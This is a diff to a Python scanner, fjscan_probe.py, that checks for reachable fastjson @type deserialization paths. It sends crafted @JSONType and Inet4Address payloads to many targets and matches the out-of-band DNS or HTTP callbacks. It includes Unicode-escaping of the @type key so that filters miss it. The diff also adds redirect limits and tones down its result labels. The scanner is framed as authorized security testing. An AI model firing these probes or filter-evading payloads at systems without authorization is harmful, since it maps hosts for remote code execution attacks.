@@ -1,12 +1,15 @@
 #!/usr/bin/env python3
 """
-fjscan_probe.py — ACTIVE, SAFE detector for the fastjson @JSONType SSRF/RCE path.
+fjscan_probe.py — ACTIVE, SAFE reachability probe for the fastjson @JSONType
+remote-resource path.
 
 Sends the crafted @type at a canary you control and correlates the out-of-band
-callback back to the target => proof the vulnerable code path is reachable.
-SAFE: the canary serves nothing (404), so no attacker class is ever loaded — you
-observe SSRF only, never RCE. (On JDK 8 a *malicious* jar would yield RCE; this
-tool never serves one.)
+callback back to the target => proof that a remote-resource lookup is reachable.
+The built-in canary serves an empty 404, so this tool never supplies a class or
+JAR. When using an external collaborator, configure or verify the same behavior;
+this client cannot control that service's response. A callback does not by itself
+identify the exact Fastjson version, loader, modern-JDK FD behavior, class
+definition, or execution impact.
 
 Two modes:
   built-in canary (self-contained):
@@ -26,7 +29,7 @@ by the unique URL PATH token (Burp shows it). See fjpayload.py header for detail
 Authorized use only.
 """
 import argparse, concurrent.futures, http.server, ipaddress, os, socket, sys, threading, time
-import urllib.request, urllib.parse
+import urllib.error, urllib.parse, urllib.request
 
 HITS = {}   # token -> list of (client_ip, request_line)
 LOCK = threading.Lock()
@@ -59,15 +62,16 @@ def uesc(s):
 
 def atype_key(evasion):
     # fastjson's lexer decodes \uXXXX in field names, so an escaped "@type" still binds
-    # but a keyword-matching WAF misses it.
+    # and may pass a filter that matches only the literal key.
     return uesc("@type") if evasion in ("ukey", "both") else "@type"
 
 
 def make_dns_obj(collab_raw, token, evasion="none"):
     # OOB probe via a fastjson primitive that ACCEPTS a dotted hostname (unlike the
-    # @JSONType jar: sink). Works with autoType off; confirms fastjson processes @type
-    # AND the host has egress. Fires a Burp Collaborator / interactsh DNS interaction
-    # for "<token>.<collab>". Not RCE — a prerequisite/reachability signal.
+    # @JSONType jar: sink). Works with autoType off and provides supporting evidence
+    # for the intended parse primitive plus host egress. Fires a Collaborator DNS interaction
+    # for "<token>.<collab>". Not RCE and not a unique implementation
+    # fingerprint — a prerequisite/reachability signal for the intended path.
     cls = "java.net.Inet4Address"
     if evasion in ("uval", "both"):
         cls = uesc(cls)
@@ -98,6 +102,64 @@ def start_canary(port):
 
 
 HTTP_METHODS = {"GET", "POST", "PUT", "PATCH", "DELETE", "OPTIONS", "HEAD"}
+SAFE_REDIRECT_HEADERS = {"accept", "content-type", "user-agent"}
+
+
+class NoRedirectHandler(urllib.request.HTTPRedirectHandler):
+    """Expose every redirect to ``send`` so scope and header policy is explicit."""
+
+    def redirect_request(self, req, fp, code, msg, headers, newurl):
+        return None
+
+
+NO_REDIRECT_OPENER = urllib.request.build_opener(NoRedirectHandler())
+
+
+def url_origin(url):
+    parsed = urllib.parse.urlsplit(url)
+    scheme = parsed.scheme.lower()
+    hostname = (parsed.hostname or "").rstrip(".").lower()
+    try:
+        port = parsed.port
+    except ValueError:
+        return None
+    if port is None:
+        port = 443 if scheme == "https" else 80 if scheme == "http" else None
+    return scheme, hostname, port
+
+
+def redirect_policy(current_url, next_url, headers):
+    """Allow exact-origin redirects and the standard HTTP-to-HTTPS upgrade.
+
+    Exact-origin redirects retain headers.  A same-host ``http:80`` to
+    ``https:443`` upgrade receives only the three non-secret base headers.
+    HTTPS downgrades, arbitrary port changes, cross-host destinations, and
+    non-HTTP(S) schemes are never contacted.
+    """
+    current_origin = url_origin(current_url)
+    next_origin = url_origin(next_url)
+    if current_origin is None or next_origin is None:
+        return None, "invalid-origin"
+    if next_origin[0] not in ("http", "https"):
+        return None, "unsupported-scheme"
+    if not current_origin[1] or current_origin[1] != next_origin[1]:
+        return None, "cross-host"
+    if current_origin == next_origin:
+        return dict(headers), None
+    if current_origin[0] == "https" and next_origin[0] == "http":
+        return None, "https-downgrade"
+    if not (
+        current_origin[0] == "http"
+        and current_origin[2] == 80
+        and next_origin[0] == "https"
+        and next_origin[2] == 443
+    ):
+        return None, "origin-change"
+    filtered = {
+        key: value for key, value in headers.items()
+        if key.lower() in SAFE_REDIRECT_HEADERS
+    }
+    return filtered, None
 
 
 def build_url(host_or_url, scheme, port, path):
@@ -144,20 +206,30 @@ def send(method, url, body, headers, timeout, max_redirects=3):
     # redirects to https reads as "HTTP 307" and is never actually tested. Follow
     # redirects manually, preserving the POST body so the probe reaches the app.
     m, u, seen = method, url, 0
+    current_headers = dict(headers)
     while True:
-        req = urllib.request.Request(u, data=body.encode(), method=m, headers=headers)
+        req = urllib.request.Request(
+            u, data=body.encode(), method=m, headers=current_headers
+        )
         try:
-            with urllib.request.urlopen(req, timeout=timeout) as r:
+            with NO_REDIRECT_OPENER.open(req, timeout=timeout) as r:
                 return f"HTTP {r.status}" + (f" (+{seen}r)" if seen else "")
         except urllib.error.HTTPError as e:
+            code = e.code
             loc = e.headers.get("Location") if e.headers else None
-            if e.code in (301, 302, 303, 307, 308) and loc and seen < max_redirects:
+            e.close()
+            if code in (301, 302, 303, 307, 308) and loc and seen < max_redirects:
+                next_url = urllib.parse.urljoin(u, loc)
+                next_headers, blocked_reason = redirect_policy(u, next_url, current_headers)
+                if blocked_reason is not None:
+                    return f"redirect-blocked-{blocked_reason} HTTP {code}"
                 seen += 1
-                u = urllib.parse.urljoin(u, loc)
-                if e.code == 303:
+                u = next_url
+                current_headers = next_headers
+                if code == 303:
                     m, body = "GET", ""
                 continue
-            return f"HTTP {e.code}" + (f" (+{seen}r)" if seen else "")
+            return f"HTTP {code}" + (f" (+{seen}r)" if seen else "")
         except Exception as e:
             return f"send-error: {e.__class__.__name__}"
 
@@ -179,32 +251,38 @@ def main(argv):
     ap.add_argument("--threads", type=int, default=20, help="concurrent request workers (default 20)")
     ap.add_argument("--auto", action="store_true",
                     help="batteries-included mode: per target send a baseline + plain DNS + "
-                         "unicode-evaded DNS probe and print a per-target rollup. Just needs "
+                         "Unicode-escaped comparison DNS probe and print a per-target rollup. Just needs "
                          "--collaborator <host> and --targets. Ignores --probe-type/--evasion/--wrap.")
     ap.add_argument("--probe-type", choices=["jsontype", "dns", "both"], default="jsontype",
-                    help="jsontype = @JSONType jar: RCE-path (int-IP; needs a raw-IP listener); "
+                    help="jsontype = @JSONType jar: fetch path (int-IP; needs a raw-IP listener); "
                          "dns = Inet4Address OOB via a DOTTED host (Collaborator-compatible, "
-                         "confirms fastjson+egress); both = send each")
+                         "provides supporting primitive+egress evidence); both = send each")
     ap.add_argument("--evasion", choices=["none", "ukey", "uval", "both"], default="none",
-                    help="WAF evasion via \\uXXXX escaping (fastjson still decodes it): "
+                    help="Unicode-escaped content-handling comparison (fastjson still decodes \\uXXXX): "
                          "ukey=escape the @type key, uval=escape the class/value, both")
     ap.add_argument("--content-type", default="application/json")
     ap.add_argument("--user-agent",
                     default="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
                             "(KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
-                    help="User-Agent (browser-like default — CDNs/WAFs often 405 bare clients)")
+                    help="User-Agent (browser-like default for a representative frontend request)")
     ap.add_argument("--header", action="append", default=[], metavar="'K: V'",
                     help="extra request header (repeatable), e.g. --header 'Origin: https://site'")
     ap.add_argument("--baseline", default=None, metavar="BODY",
                     help="also send this benign body per target as a reachability control "
-                         "(e.g. '{\"a\":1}') — distinguishes CDN/path 405 from a WAF payload block")
+                         "(e.g. '{\"a\":1}'); a response differential is non-attributive")
     ap.add_argument("--wrap", default="{{P}}", help="body template; {{P}} = the probe object")
     ap.add_argument("--timeout", type=float, default=8.0)
     ap.add_argument("--max-redirects", type=int, default=3,
-                    help="follow up to N redirects preserving the POST (0 = don't follow; "
-                         "http->https redirects are otherwise left untested)")
+                    help="follow up to N exact-origin redirects or standard same-host "
+                         "http:80 -> https:443 upgrades (0 = don't follow). HTTPS "
+                         "downgrades, other origin changes and cross-host redirects are "
+                         "blocked; upgrades keep only Content-Type, User-Agent and Accept")
     ap.add_argument("--wait", type=float, default=10.0, help="seconds to wait for callbacks (built-in mode)")
     args = ap.parse_args(argv)
+
+    targets = load_targets(args.targets, args.scheme, args.target_port, args.path, args.method)
+    if not targets:
+        sys.exit("[!] no targets loaded (input was empty or contained only comments)")
 
     if args.canary_ip:
         host, note = encode_host(args.canary_ip)
@@ -231,20 +309,19 @@ def main(argv):
         sys.exit("[!] dns/auto mode needs --collaborator set to a hostname "
                  "(e.g. your Burp Collaborator subdomain), not an int/IP.")
 
-    targets = load_targets(args.targets, args.scheme, args.target_port, args.path, args.method)
     token_map = {}
     jobs = []
     baseline_body = args.baseline or '{"fjscan":"baseline"}'
     for i, (method, url) in enumerate(targets):
-        base = "%s%s" % (slug(url), os.urandom(2).hex())
+        base = "%s%s" % (slug(url), os.urandom(8).hex())
         if args.auto:
-            # batteries-included: baseline control + plain DNS + unicode-evaded DNS
+            # batteries-included: baseline control + plain DNS + Unicode-escaped comparison DNS
             btok = "b" + base
             token_map[btok] = (method, url, "baseline")
             jobs.append((btok, method, url, baseline_body))
             for vtag, ev in (("p", "none"), ("e", "both")):
                 tok = "d" + vtag + base
-                token_map[tok] = (method, url, "dns-" + ("plain" if ev == "none" else "evaded"))
+                token_map[tok] = (method, url, "dns-" + ("plain" if ev == "none" else "escaped"))
                 jobs.append((tok, method, url, make_dns_obj(collab_raw, tok, ev)))
             continue
         if args.probe_type in ("jsontype", "both"):
@@ -292,20 +369,24 @@ def main(argv):
         time.sleep(args.wait)
         srv.shutdown()
         print("\n===== RESULT =====")
-        vuln = 0
-        for token, (method, url, kind) in token_map.items():
+        reachable = 0
+        probe_items = [
+            (token, details) for token, details in token_map.items()
+            if details[2] != "baseline"
+        ]
+        for token, (method, url, kind) in probe_items:
             with LOCK:
                 hits = HITS.get(token)
             if hits:
-                vuln += 1
-                print(f"  VULNERABLE  [{kind}] {url}")
+                reachable += 1
+                print(f"  FETCH_REACHABLE [{kind}] {url}")
                 for cip, rl in hits:
                     print(f"              callback from {cip}: {rl}")
             else:
                 print(f"  no-callback [{kind}] {url}")
-        print(f"\nVULNERABLE={vuln}/{len(token_map)}  "
-              f"(callback = @JSONType SSRF path reachable)")
-        return 2 if vuln else 0
+        print(f"\nFETCH_REACHABLE={reachable}/{len(probe_items)}  "
+              f"(callback proves lookup/egress, not class loading or RCE)")
+        return 2 if reachable else 0
     elif args.auto:
         # per-target rollup grouped by URL
         by_url = {}
@@ -314,16 +395,19 @@ def main(argv):
         print("\n===== per-target summary =====")
         for u, kinds in by_url.items():
             bl = status_map.get(kinds.get("baseline"), "?")
-            dp_tok, de_tok = kinds.get("dns-plain"), kinds.get("dns-evaded")
+            dp_tok, de_tok = kinds.get("dns-plain"), kinds.get("dns-escaped")
             print(f"  {u}")
             print(f"      baseline={bl}   dns-plain={status_map.get(dp_tok,'?')}   "
-                  f"dns-evaded={status_map.get(de_tok,'?')}")
+                  f"dns-escaped={status_map.get(de_tok,'?')}")
             print(f"      watch Burp for:  {dp_tok}.{collab_raw}   |   {de_tok}.{collab_raw}")
         print("\nRead it:")
-        print("  * a Burp DNS hit for a d…-token  => that host runs fastjson + has egress = EXPOSED")
-        print("  * baseline reaches the app (2xx/4xx/5xx) but probes blocked + no hit => filtered at")
-        print("    the edge / not reached (inconclusive) — confirm with the artifact check (fjscan_static.py)")
-        print("  * baseline itself blocked => wrong endpoint/shape, not the app")
+        print("  * a Burp DNS hit for a d…-token  => evidence consistent with the intended")
+        print("    InetAddress parse primitive + egress; not a unique Fastjson fingerprint and")
+        print("    not proof of the @JSONType/FD execution path")
+        print("  * a baseline/probe status differential is consistent with content-sensitive edge,")
+        print("    middleware, validation, or application handling; it is inconclusive without")
+        print("    callback or artifact corroboration (fjscan_static.py)")
+        print("  * if both are blocked, the endpoint/method/path remains inconclusive")
         return 0
     else:
         print("\n[*] external mode — correlate these in Burp Collaborator / interactsh:")
@@ -333,8 +417,10 @@ def main(argv):
             elif kind == "jsontype" and host is not None:
                 print(f"    HTTP GET  /{token}  (host {host})   <=  {method} {url}")
             # baseline jobs are benign controls with no OOB correlation — not listed
-        print("\n(dns hits confirm fastjson + egress; jsontype path via int-IP usually will NOT "
-              "register in a public Collaborator — see README.)")
+        print("\nUNVERIFIED_SENT: this mode does not query the collaborator and therefore exits 0. "
+              "A token callback is evidence consistent with the intended primitive and egress, "
+              "not a unique Fastjson fingerprint. The jsontype int-IP path may not register in "
+              "a public Collaborator; see README.")
         return 0
 
 
